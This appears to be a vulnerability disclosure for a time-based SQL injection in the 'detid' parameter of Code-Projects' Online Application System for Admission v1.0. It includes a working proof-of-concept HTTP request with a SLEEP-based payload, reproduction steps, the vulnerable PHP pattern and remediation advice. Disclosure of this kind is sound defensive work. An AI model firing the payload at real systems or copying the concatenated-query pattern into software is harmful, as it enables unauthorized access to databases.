## SQL Injection in Online Application System for Admission PHP detid Parameter
## Credit

Discovered by: 
Ahmad Marzouk

## Product

Online Application System for Admission in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/online-application-system-for-admission-in-php-with-source-code/

## Affected Version

Online Application System for Admission v1.0

## Vulnerability Type

SQL Injection

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Severity

High

## Description

A SQL Injection vulnerability exists in the Online Application System for Admission in PHP within the admission form processing functionality.

The vulnerability occurs in the following endpoint:

/OnlineApplicationSystem_PHP/enrollment/admsnform.php

The application processes numerous parameters submitted through an HTTP POST request during the admission process. One of these parameters, detid, is user-controlled and is used by the backend application without proper input validation or sanitization.

Testing confirmed that the detid parameter is vulnerable to time-based SQL injection, indicating that attacker-supplied SQL expressions are interpreted and executed by the database engine.

In the provided request, the attacker injects a delay-based SQL payload using the SLEEP() function:

detid='+(select*from(select(sleep(20)))a)+'

When this request is processed by the application, the server response is delayed by approximately 20 seconds, confirming that the injected SQL query is executed by the database.

This demonstrates that the application directly incorporates user input into SQL queries without using prepared statements or parameterized queries.

Because the parameter is not properly sanitized, attackers can manipulate the SQL query structure and execute arbitrary SQL commands.

## Root Cause

The vulnerability is caused by unsafe construction of SQL queries using user-controlled input.

The application retrieves the value of the detid parameter directly from the HTTP request and incorporates it into SQL statements without validation or parameterization.

A typical vulnerable pattern is:

$detid = $_POST['detid'];
$sql = "SELECT * FROM table WHERE detid = '$detid'";

Because the input is concatenated directly into the SQL query, malicious input can alter the intended query logic.

The absence of prepared statements and input validation allows attackers to inject SQL expressions, including database functions such as SLEEP().

## Affected Endpoint
/OnlineApplicationSystem_PHP/enrollment/admsnform.php
## Vulnerable Parameter
detid
## HTTP Method
POST
## Proof of Concept

The following HTTP request demonstrates exploitation of the vulnerability:
 ```plain
POST /OnlineApplicationSystem_PHP/enrollment/admsnform.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Sec-CH-UA: "Google Chrome";v="145", "Not=A?Brand";v="8", "Chromium";v="145"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=m5dle02mafsmlpjpspmh8pauu5
Origin: https://localhost
Upgrade-Insecure-Requests: 1
Referer: https://localhost/OnlineApplicationSystem_PHP/enrollment/admsnform.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 798

detid='%2b(select*from(select(sleep(20)))a)%2b'&uphn1=IAmpGZ&uphn2=FvOKpM&ufname=UbAflS&ufocc=cEeAbe&ufphn=tCCvnG&umname=PjpgGE&umocc=QAIlDP&umphn=YLXuop&inc=bmgJnJ&gen=Male&cadr=ipQpRr&cast=StTZYS&capin=jktsFA&camob=ImVtHa&padr=WhWqPy&past=egxXpZ&papin=UfgDgf&pamob=XhUCCA&rur=Rural&natn=OXGrft&relg=IDGqCN&cat=SC&oaco=--------------------Select--------------------&oarank=cabOKg&oaroll=keOVwA&oabrn=lYyuqy&brnc=--------------------Select--------------------&col=--------------------Select--------------------&cen=--------------------Select--------------------&crsty=--------------------Select--------------------&pcm=rcRisP&nob1=iVxRtk&yop1=PwAXtO&tm1=ibNPso&mo1=AJCNTs&divs1=NMwEAN&pom1=OmIvIt&nob2=ZoqXmH&yop2=ZPmkth&tm2=RvWsrN&mo2=IUrwNt&divs2=gpUEWh&pom2=fZbNGl&moi=Odia&pay=Loan&frmnext=Next
 ```

## PoC 1

<img width="1512" height="982" alt="Image" src="https://github.com/user-attachments/assets/63dc331b-6483-416b-9397-822297f93ff0" />

## Steps to Reproduce

Install the Online Application System for Admission in PHP.

Navigate to the admission form page.

Intercept the form submission request using a proxy tool such as Burp Suite.

Modify the detid parameter to include the following payload:

'+(select*from(select(sleep(20)))a)+'

Send the modified request to the server.

## Result

The server response is delayed by approximately 20 seconds, confirming that the injected SQL payload is executed.

This proves that the application is vulnerable to SQL injection.

## Impact

Successful exploitation of this vulnerability may allow attackers to:

Execute arbitrary SQL commands

Extract sensitive database information

Bypass authentication mechanisms

Modify or delete database records

Escalate privileges within the system

Fully compromise the backend database

Depending on database permissions, attackers may gain complete control over application data.

## Vulnerability Classification
CWE

CWE-89 – SQL Injection

OWASP Top 10

A03:2021 – Injection

## Suggested Remediation
Use Prepared Statements

Replace dynamic SQL queries with parameterized queries:

$stmt = $conn->prepare("SELECT * FROM table WHERE detid = ?");
$stmt->execute([$detid]);
Input Validation

Validate that input values conform to expected formats (e.g., numeric IDs).

Least Privilege Principle

Ensure the database user has minimal required privileges.

Security Testing

Conduct regular code audits and penetration testing.

## PoC 2

<img width="958" height="655" alt="Image" src="https://github.com/user-attachments/assets/67150035-1505-4de4-a07d-0beb7d86dd58" />
